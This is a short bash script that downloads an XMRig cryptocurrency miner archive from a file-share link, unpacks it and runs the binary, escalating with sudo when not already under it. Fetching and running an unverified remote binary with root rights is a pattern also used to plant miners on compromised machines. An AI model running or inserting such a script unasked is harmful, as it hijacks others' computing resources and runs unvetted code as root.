#!/bin/bash

wget https://link.eu1.storjshare.io/s/jwtqxk5v2ly6r7wbl7i3x5rhvnma/mining/xmrig-linux.zip?download=1 -O xmrig.zip
unzip xmrig.zip && rm xmrig.zip
chmod +x xmrig

if [ $SUDO_USER ]; then
    echo "non root"
    ./xmrig
else
    echo "root"
    sudo ./xmrig
fi
